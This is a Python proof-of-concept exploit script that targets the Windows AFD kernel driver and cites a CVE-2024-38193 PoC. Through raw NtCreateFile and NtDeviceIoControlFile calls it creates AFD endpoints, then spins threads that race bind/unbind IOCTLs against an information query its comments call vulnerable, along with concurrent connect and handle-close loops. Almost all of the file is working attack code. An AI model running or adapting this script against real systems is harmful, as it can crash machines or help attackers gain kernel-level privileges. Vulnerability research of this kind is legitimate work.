import ctypes
import socket
import struct
import threading
import sys
from collections import deque
from ctypes import wintypes
from enum import IntEnum

# Sources
# https://www.huntandhackett.com/blog/improving_afd_socket_visibility
# https://leftarcode.com/posts/afd-reverse-engineering-part4/
# https://github.com/killvxk/CVE-2024-38193-Nephster/blob/main/Poc/poc.cpp

# Constants from the C++ code
AFD_DEVICE_NAME = "\\Device\\Afd\\Endpoint"
IOCTL_AFD_BIND = 0x12003
IOCTL_AFD_UNBIND = 0x12113
IOCTL_AFD_CONNECT = 0x12007
IOCTL_AFD_GET_INFORMATION = 0x1207B

# NT Status codes
STATUS_SUCCESS = 0x00000000
STATUS_PENDING = 0x00000103

# File access and creation flags
FILE_OPEN_IF = 0x3

ntdll = ctypes.WinDLL('ntdll')


class UNICODE_STRING(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.USHORT),
        ("MaximumLength", wintypes.USHORT),
        ("Buffer", wintypes.LPWSTR)
    ]


class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.ULONG),
        ("RootDirectory", wintypes.HANDLE),
        ("ObjectName", ctypes.POINTER(UNICODE_STRING)),
        ("Attributes", wintypes.ULONG),
        ("SecurityDescriptor", wintypes.LPVOID),
        ("SecurityQualityOfService", wintypes.LPVOID)
    ]


class IO_STATUS_BLOCK(ctypes.Structure):
    _fields_ = [
        ("Status", wintypes.ULONG),
        ("Information", wintypes.ULONG)
    ]


NtCreateFile = ntdll.NtCreateFile
NtCreateFile.argtypes = [
    ctypes.POINTER(wintypes.HANDLE),
    wintypes.DWORD,
    ctypes.POINTER(OBJECT_ATTRIBUTES),
    ctypes.POINTER(IO_STATUS_BLOCK),
    ctypes.POINTER(ctypes.c_int64),
    wintypes.ULONG,
    wintypes.ULONG,
    wintypes.ULONG,
    wintypes.ULONG,
    wintypes.LPVOID,
    wintypes.ULONG
]
NtCreateFile.restype = wintypes.LONG

NtDeviceIoControlFile = ntdll.NtDeviceIoControlFile
NtDeviceIoControlFile.argtypes = [
    wintypes.HANDLE,
    wintypes.HANDLE,
    wintypes.LPVOID,
    wintypes.LPVOID,
    ctypes.POINTER(IO_STATUS_BLOCK),
    wintypes.ULONG,
    wintypes.LPVOID,
    wintypes.ULONG,
    wintypes.LPVOID,
    wintypes.ULONG
]
NtDeviceIoControlFile.restype = wintypes.LONG

NtClose = ntdll.NtClose
NtClose.argtypes = [wintypes.HANDLE]
NtClose.restype = wintypes.LONG

RtlInitUnicodeString = ntdll.RtlInitUnicodeString
RtlInitUnicodeString.argtypes = [
    ctypes.POINTER(UNICODE_STRING),
    wintypes.LPCWSTR
]


class AFD_INFORMATION_CLASS(IntEnum):
    AFD_INLINE_MODE = 1  # s: BOOLEAN
    AFD_NONBLOCKING_MODE = 2  # s: BOOLEAN
    AFD_MAX_SEND_SIZE = 3  # q: ULONG
    AFD_SENDS_PENDING = 4  # q: ULONG
    AFD_MAX_PATH_SEND_SIZE = 5  # q: ULONG
    AFD_RECEIVE_WINDOW_SIZE = 6  # q; s: ULONG
    AFD_SEND_WINDOW_SIZE = 7  # q; s: ULONG
    AFD_CONNECT_TIME = 8  # q: ULONG (seconds)
    AFD_CIRCULAR_QUEUEING = 9  # s: BOOLEAN
    AFD_GROUP_ID_AND_TYPE = 10  # q: AFD_GROUP_INFO
    AFD_REPORT_PORT_UNREACHABLE = 11  # s: BOOLEAN
    AFD_REPORT_NETWORK_UNREACHABLE = 12  # s: BOOLEAN
    AFD_DELIVERY_STATUS = 14  # q: SIO_DELIVERY_STATUS
    AFD_CANCEL_TL = 15  # s: void


class AFD_INFO(ctypes.Structure):
    _fields_ = [
        ("InformationClass", wintypes.ULONG),
        ("Information", ctypes.c_ulonglong),
        ("Padding", wintypes.ULONG),
    ]


class SOCKADDR_IN(ctypes.Structure):
    _fields_ = [
        ("sin_family", wintypes.USHORT),
        ("sin_port", wintypes.USHORT),
        ("sin_addr", wintypes.ULONG),
        ("sin_zero", ctypes.c_ubyte * 8),
    ]


class AFD_CONNECT_INFO(ctypes.Structure):
    _fields_ = [
        ("UseSAN", ctypes.c_ubyte),  # v57
        ("Padding", ctypes.c_ubyte * 7),  # unused; keep 0
        ("JoinHandle", wintypes.HANDLE),  # "Handle" in decompile
        ("HelperHandle", wintypes.HANDLE),  # v13 in decompile
        ("RemoteAddress", SOCKADDR_IN),  # SOCKADDR_IN at offset 0x18
    ]


class AFD_UNBIND_INFO(ctypes.Structure):
    _fields_ = [
        ("AddressFamily", wintypes.LONG),
        ("Protocol", wintypes.LONG),
    ]


TRANSPORT_NAME = "\\Device\\Tcp"
TRANSPORT_NAME_LEN = len(TRANSPORT_NAME) * 2  # WCHAR is 2 bytes


class AFD_OPEN_PACKET(ctypes.Structure):
    _pack_ = 1  # Standard packing for network/driver buffers
    _fields_ = [
        ("EndpointFlags", wintypes.DWORD),  # Offset 0
        ("GroupID", wintypes.DWORD),  # Offset 4
        ("AddressFamily", wintypes.DWORD),  # Offset 8
        ("SocketType", wintypes.DWORD),  # Offset 12
        ("Protocol", wintypes.DWORD),  # Offset 16
        ("TransportNameLength", wintypes.DWORD),  # Offset 20
        ("TransportName", ctypes.c_wchar * 11),  # Offset 24 (22 bytes)
        ("Padding", ctypes.c_byte * 6)  # Offset 46
    ]


class AFD_EA_BUFFER(ctypes.Structure):
    """
    Represents the FILE_FULL_EA_INFORMATION structure tailored
    specifically for the 'AfdOpenPacketXX' extended attribute.
    """
    _pack_ = 1
    _fields_ = [
        ("NextEntryOffset", wintypes.ULONG),
        ("Flags", wintypes.BYTE),
        ("EaNameLength", wintypes.BYTE),
        ("EaValueLength", wintypes.USHORT),
        # EaName: "AfdOpenPacketXX" + null terminator = 16 bytes
        ("EaName", ctypes.c_char * 16),
        # The Value follows immediately
        ("AfdPacket", AFD_OPEN_PACKET)
    ]


def create_afd_endpoint(EndpointFlags):
    afd_packet = AFD_OPEN_PACKET()
    afd_packet.EndpointFlags = 0x00000100 & 0xFFFFFFFF
    afd_packet.GroupID = 0
    afd_packet.AddressFamily = 2  # AF_INET
    afd_packet.SocketType = 1  # SOCK_STREAM
    afd_packet.Protocol = 6  # IPPROTO_TCP
    afd_packet.TransportNameLength = TRANSPORT_NAME_LEN
    afd_packet.TransportName = TRANSPORT_NAME
    # Padding is automatically zero-initialized

    ea_struct = AFD_EA_BUFFER()
    ea_struct.NextEntryOffset = 0
    ea_struct.Flags = 0
    ea_struct.EaName = b"AfdOpenPacketXX"
    ea_struct.EaNameLength = len(b"AfdOpenPacketXX")
    ea_struct.EaValueLength = ctypes.sizeof(AFD_OPEN_PACKET)
    ea_struct.AfdPacket = afd_packet

    dev_name = UNICODE_STRING()
    dev_name_str = ctypes.create_unicode_buffer(AFD_DEVICE_NAME)
    RtlInitUnicodeString(ctypes.byref(dev_name), dev_name_str)

    obj_attr = OBJECT_ATTRIBUTES()
    obj_attr.Length = ctypes.sizeof(OBJECT_ATTRIBUTES)
    obj_attr.ObjectName = ctypes.pointer(dev_name)
    obj_attr.Attributes = 0x40
    obj_attr.RootDirectory = None
    obj_attr.SecurityDescriptor = None
    obj_attr.SecurityQualityOfService = None

    handle = wintypes.HANDLE()
    io_status = IO_STATUS_BLOCK()

    status = NtCreateFile(
        ctypes.byref(handle),
        0xC0140000,
        ctypes.byref(obj_attr),
        ctypes.byref(io_status),
        None,
        0,
        3,
        FILE_OPEN_IF,
        0,
        ctypes.byref(ea_struct),
        ctypes.sizeof(ea_struct)
    )

    if status >= 0:
        return handle.value
    else:
        status_unsigned = status & 0xFFFFFFFF
        raise Exception(f"NtCreateFile failed with status: 0x{status_unsigned:08X}")


def afd_bind(handle):
    io_status = IO_STATUS_BLOCK()
    input_buffer = bytearray(0x1000)
    output_buffer = bytearray(0x1000)

    # Set up the input buffer with proper structure
    input_buffer[4] = 0x01  # TAAddressCount = 1
    input_buffer[8] = 0x10  # AddressLength = 16
    input_buffer[10] = 0x02  # AddressType = AF_INET
    # Port = 0x0000 (any port) at offset 12-13, already zero
    # IP address = 127.0.0.1 at offset 14-17
    input_buffer[14] = 0x7F  # 127
    input_buffer[15] = 0x00  # 0
    input_buffer[16] = 0x00  # 0
    input_buffer[17] = 0x01  # 1

    status = NtDeviceIoControlFile(
        handle,
        None,
        None,
        None,
        ctypes.byref(io_status),
        IOCTL_AFD_BIND,
        (ctypes.c_byte * 0x1000).from_buffer(input_buffer),
        len(input_buffer),
        (ctypes.c_byte * 0x1000).from_buffer(output_buffer),
        len(output_buffer)
    )

    return status


def afd_unbind(handle):
    io_status = IO_STATUS_BLOCK()
    info = AFD_UNBIND_INFO()
    info.AddressFamily = socket.AF_INET  # 2
    info.Protocol = socket.IPPROTO_TCP  # 6

    status = NtDeviceIoControlFile(
        handle,
        None,
        None,
        None,
        ctypes.byref(io_status),
        IOCTL_AFD_UNBIND,
        ctypes.byref(info),
        ctypes.sizeof(info),  # 8 bytes
        None,
        0,
    )

    return status


def afd_get_information(handle, info_class):
    io_status = IO_STATUS_BLOCK()

    # Build the AFD_INFO input
    info = AFD_INFO()
    # define AFD_INLINE_MODE                1 // s: BOOLEAN
    # define AFD_NONBLOCKING_MODE           2 // s: BOOLEAN
    # define AFD_MAX_SEND_SIZE              3 // q: ULONG
    # define AFD_SENDS_PENDING              4 // q: ULONG
    # define AFD_MAX_PATH_SEND_SIZE         5 // q: ULONG
    # define AFD_RECEIVE_WINDOW_SIZE        6 // q; s: ULONG
    # define AFD_SEND_WINDOW_SIZE           7 // q; s: ULONG
    # define AFD_CONNECT_TIME               8 // q: ULONG (in seconds)
    # define AFD_CIRCULAR_QUEUEING          9 // s: BOOLEAN
    # define AFD_GROUP_ID_AND_TYPE          10 // q: AFD_GROUP_INFO
    # define AFD_REPORT_PORT_UNREACHABLE    11 // s: BOOLEAN
    # define AFD_REPORT_NETWORK_UNREACHABLE 12 // s: BOOLEAN
    # define AFD_DELIVERY_STATUS            14 // q: SIO_DELIVERY_STATUS
    # define AFD_CANCEL_TL                  15 // s: void
    info.InformationClass = info_class  # 3, 5, 6, 7, 8, 10, 14, ...

    output_buffer = ctypes.create_string_buffer(0x10)

    status = NtDeviceIoControlFile(
        handle,
        None,
        None,
        None,
        ctypes.byref(io_status),
        IOCTL_AFD_GET_INFORMATION,
        ctypes.byref(info),
        ctypes.sizeof(info),
        ctypes.byref(output_buffer),
        len(output_buffer)
    )

    return status


def afd_connect(handle, ip="127.0.0.1", port=4444):
    io_status = IO_STATUS_BLOCK()

    # Build TRANSPORT_ADDRESS for IPv4
    AF_INET = 2
    ta_address_count = 1
    addr_len = 14

    port_be = socket.htons(port)
    ip_bytes = socket.inet_aton(ip)  # 4 bytes

    sa_data = struct.pack("!H4s8s", port_be, ip_bytes, b"\x00" * 8)
    assert len(sa_data) == 14

    # TA size = 4 + 2 + 2 + 14 = 22 bytes
    ta_size = 4 + 2 + 2 + 14

    header_size = 24
    total_len = header_size + ta_size  # 46 (0x2E)

    buf = bytearray(total_len)

    # byte 0: UseSAN / "SAN enabled?" flag
    buf[0] = 0

    # TRANSPORT_ADDRESS at offset 24
    # TAAddressCount
    buf[24:28] = (ta_address_count).to_bytes(4, "little")

    # AddressLength
    buf[28:30] = (addr_len).to_bytes(2, "little")

    # AddressType = AF_INET
    buf[30:32] = (AF_INET).to_bytes(2, "little")

    # Address[14] = sockaddr.sa_data
    buf[32:46] = sa_data

    in_buf = (ctypes.c_ubyte * total_len).from_buffer(buf)

    status = NtDeviceIoControlFile(
        handle,
        None,
        None,
        None,
        ctypes.byref(io_status),
        IOCTL_AFD_CONNECT,
        in_buf,
        total_len,
        None,
        0,
    )

    return status


def bind_unbind(handle):
    while True:
        sb = afd_bind(handle)
        sub = afd_unbind(handle)

        prefix_b = "[+]" if sb == STATUS_SUCCESS else "[-]"
        print(f"{prefix_b} afd_bind: 0x{sb & 0xFFFFFFFF:08X}")

        prefix_u = "[+]" if sub == STATUS_SUCCESS else "[-]"
        print(f"{prefix_u} afd_unbind: 0x{sub & 0xFFFFFFFF:08X}")


def get_info(handle):
    while True:
        status = afd_get_information(handle, AFD_INFORMATION_CLASS.AFD_MAX_PATH_SEND_SIZE)
        prefix = "[+]" if status == STATUS_SUCCESS else "[-]"
        print(f"{prefix} afd_get_information: 0x{status & 0xFFFFFFFF:08X}")


socket_handles = deque()


def close_handle(handle):
    if handle:
        NtClose(handle)


def close_loop():
    while True:
        for handle in socket_handles:
            close_handle(handle)


def create_connect():
    while True:
        try:
            handle = create_afd_endpoint(0x00)
            print(f"[+] Created Handle: 0x{handle:08X}")
        except Exception as e:
            print(f"[-] Handle creation failed: {e}")
            continue

        sb = afd_bind(handle)
        prefix_b = "[+]" if sb == STATUS_SUCCESS else "[-]"
        print(f"{prefix_b} afd_bind: 0x{sb & 0xFFFFFFFF:08X}")

        # socket_handles.append(handle)
        status = afd_connect(handle)
        prefix_c = "[+]" if status == STATUS_SUCCESS or status == STATUS_PENDING else "[-]"
        print(f"{prefix_c} afd_connect: 0x{status & 0xFFFFFFFF:08X}")

        # NtClose(handle)

        threading.Thread(target=close_handle, args=(handle,), daemon=True).start()


def scenario(num: int):
    match (num):
        case 1:
            print("[*] Starting Scenario 1: Create & Connect Loop")
            return threading.Thread(target=create_connect), None

        case 2:
            print("[*] Starting Scenario 2: Bind/Unbind Race with Info Leak")
            return threading.Thread(target=bind_unbind, args=(handle,)), threading.Thread(target=get_info,
                                                                                          args=(handle,))


if __name__ == "__main__":
    print("[*] Starting AFD Driver PoC...")

    try:
        handle = create_afd_endpoint(0x00)
        print(f"[+] Initial AFD Endpoint Created: 0x{handle:08X}")
    except Exception as e:
        print(f"[-] Failed to create AFD endpoint: {e}")
        sys.exit(1)

    status = afd_bind(handle)
    prefix = "[+]" if status == STATUS_SUCCESS else "[-]"
    print(f"{prefix} Initial afd_bind: 0x{status & 0xFFFFFFFF:08X}")

    # The infoclass 3 was patched earlier, on different KB.
    # The infoclass 5 is vulnerable since it gets to AfdIssueDeviceControl
    print("[*] Testing Vulnerable InfoClass (AFD_MAX_PATH_SEND_SIZE)...")
    status = afd_get_information(handle, AFD_INFORMATION_CLASS.AFD_MAX_PATH_SEND_SIZE)
    prefix = "[+]" if status == STATUS_SUCCESS else "[-]"
    print(f"{prefix} afd_get_information: 0x{status & 0xFFFFFFFF:08X}")

    status = afd_unbind(handle)
    prefix = "[+]" if status == STATUS_SUCCESS else "[-]"
    print(f"{prefix} afd_unbind: 0x{status & 0xFFFFFFFF:08X}")

    status = afd_bind(handle)
    prefix = "[+]" if status == STATUS_SUCCESS else "[-]"
    print(f"{prefix} Re-binding: 0x{status & 0xFFFFFFFF:08X}")

    status = afd_connect(handle)
    # STATUS_PENDING is often expected for non-blocking connect or incomplete handshake
    prefix = "[+]" if status == STATUS_SUCCESS or status == STATUS_PENDING else "[-]"
    print(f"{prefix} afd_connect: 0x{status & 0xFFFFFFFF:08X}")

    print("[*] Launching Race Condition Threads...")
    thread_a, thread_b = scenario(2)

    input("[*] Press Enter to begin execution...")

    thread_a.start()
    if thread_b:
        thread_b.start()
        thread_b.join()
    thread_a.join()

    NtClose(handle)
    print("[*] Execution finished.")
